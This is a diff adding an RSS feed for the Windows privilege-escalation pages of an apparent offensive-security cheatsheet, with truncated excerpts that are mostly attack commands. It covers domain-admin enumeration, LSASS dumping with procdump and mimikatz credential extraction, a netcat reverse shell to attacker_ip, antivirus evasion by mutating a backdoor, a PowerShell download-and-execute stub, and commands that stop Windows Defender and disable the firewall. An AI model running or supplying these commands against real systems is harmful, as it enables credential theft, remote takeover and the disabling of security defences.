@@ -1,0 +1,52 @@
+<?xml version="1.0" encoding="utf-8" standalone="yes" ?>
+<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom">
+  <channel>
+    <title>Privilege Escalation on Offensive Security Cheatsheet</title>
+    <link>/windows-systems/privilege-escalation/</link>
+    <description>Recent content in Privilege Escalation on Offensive Security Cheatsheet</description>
+    <generator>Hugo -- gohugo.io</generator>
+    <language>en-us</language>
+    
+	<atom:link href="/windows-systems/privilege-escalation/index.xml" rel="self" type="application/rss+xml" />
+    
+    
+    <item>
+      <title>Admin and Processes</title>
+      <link>/windows-systems/privilege-escalation/admin_processes/</link>
+      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
+      
+      <guid>/windows-systems/privilege-escalation/admin_processes/</guid>
+      <description>Local Processes # Check local processes net group “Domain Admins” /domain # The account running the process should be in 7th column: tasklist /v # Then compare the 2 results 
+Sessions # Query DC to check about domain active sessions: net group “Domain Controllers” /domain (build dcs.txt with it) nslookup –type=SRV _ldap._tcp. net group “Domain Admins” /domain (build admins.txt with it) netsess.exe netsess.exe servername netsess.exe servername /full (admin required) FOR /F %i in (dcs.</description>
+    </item>
+    
+    <item>
+      <title>LSASS and Mimikatz</title>
+      <link>/windows-systems/privilege-escalation/lsass_mimikatz/</link>
+      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
+      
+      <guid>/windows-systems/privilege-escalation/lsass_mimikatz/</guid>
+      <description>LSASS # Avoiding running Mimikatz on the target can be a nice solution for stealth # You can just dump the LSASS process, get them and parse it locally procdump.exe -accepteula -ma lsass.exe lsass.dmp 
+Mimikatz # If you have an LSASS dump, you can use the minidump module mimikatz # sekurlsa::minidump lsass.DMP mimikatz # sekurlsa::logonPasswords /full # You can upload mimikatz to a remote machine with smbclient # Or you can use crackmapexec # Executon may fail but the binary will be uploaded in C:\\Windows\\mimikatz.</description>
+    </item>
+    
+    <item>
+      <title>Tricks</title>
+      <link>/windows-systems/privilege-escalation/tricks/</link>
+      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
+      
+      <guid>/windows-systems/privilege-escalation/tricks/</guid>
+      <description>Global Tricks https://enigma0x3.net/2015/01/21/phishing-for-credentials-if-you-want-it-just-ask/ https://guif.re/windowseop https://hackingandsecurity.blogspot.com/2017/09/oscp-windows-priviledge-escalation.html # You can feed syteminfo output to windows-exploit-suggester ./windows-exploit-suggester.py --update ./windows-exploit-suggester.py --database 2019-02-19-mssb.xls --systeminfo /home/m***REMOVED***/Documents/Galactic/systeminfo.txt # Getting shell in limited interpreter system(&amp;#34;start cmd.exe /k $cmd&amp;#34;) # Reverse shell nc.exe attacker_ip attacker_port -e cmd.exe # From admin to SYSTEM psexec.exe -i -s %SystemRoot%\system32\cmd.exe # AV Bypass # You can generate mutated binary hyperion.exe ../backdoor.exe ../backdoor_mutation.exe # Download and exec powershell on target powershell.exe &amp;#34;IEX (New-Object Net.</description>
+    </item>
+    
+    <item>
+      <title>Windows Defender</title>
+      <link>/windows-systems/privilege-escalation/windows_defender/</link>
+      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
+      
+      <guid>/windows-systems/privilege-escalation/windows_defender/</guid>
+      <description># Requires admin privileges or being able to run a custom powershell sudo ! (sudo.ps1) powershell -ExecutionPolicy ByPass -command &amp;#34;&amp;amp; { . C:\Users\Username\AppData\Local\Temp\sudo_PS1-0.ps1; }&amp;#34; # Stop Windows Defender using cmd.exe sc stop WinDefend # Identify firewall profiles for an user netsh advfirewall show allprofiles # Disable all firewall profiles for an user netsh advfirewall set allprofiles state off # Totally disable the firewall netsh firewall set opmode disable</description>
+    </item>
+    
+  </channel>
+</rss>
